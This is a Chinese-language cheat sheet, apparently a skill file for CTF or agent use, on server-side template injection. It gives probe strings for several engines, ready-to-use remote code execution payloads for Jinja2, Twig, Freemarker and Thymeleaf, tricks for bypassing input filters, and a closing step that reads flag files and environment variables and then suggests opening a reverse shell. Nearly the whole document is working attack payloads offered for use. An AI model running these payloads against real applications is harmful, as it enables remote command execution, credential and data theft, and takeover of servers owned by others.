---
name: web/ssti
description: 模板注入：探测引擎、构造 RCE 链、绕过过滤
when_to_use: 回显里出现 49/7777777 之类算术结果，或参数被拼进模板渲染
categories: [web]
keywords: [ssti, template, jinja2, twig, freemarker, 模板注入]
---
## 探测

```
{{7*7}}   -> 49      Jinja2 / Twig / Nunjucks
${7*7}    -> 49      Freemarker / Thymeleaf / Spring EL
<%= 7*7 %>-> 49      ERB / EJS
#{7*7}    -> 49      Ruby / Thymeleaf
```

## Jinja2 RCE（最常见）

```jinja
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag').read() }}
{{ lipsum.__globals__["os"].popen("cat /flag").read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

无引号时的替代：`{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}`。

## 过滤绕过

- `_` 被过滤：用 `attr` 链 + `request.args` 传参
- `.` 被过滤：`{{()|attr('__class__')}}`、`{{dict(a=1)|join}}`
- `{{` 被过滤：`{%print(7*7)%}`、`${%...%}`
- 关键词被过滤：`{%set a='__glo'+'bals__'%}` 字符串拼接

## 其他引擎

- **Twig**：`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
- **Freemarker**：`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- **Thymeleaf**：`${T(java.lang.Runtime).getRuntime().exec('id')}`（Spring 表达式）

## 验证

先 `id` / `hostname`，再 `cat /flag*; env | grep -i flag`，最后反弹 shell 更稳。
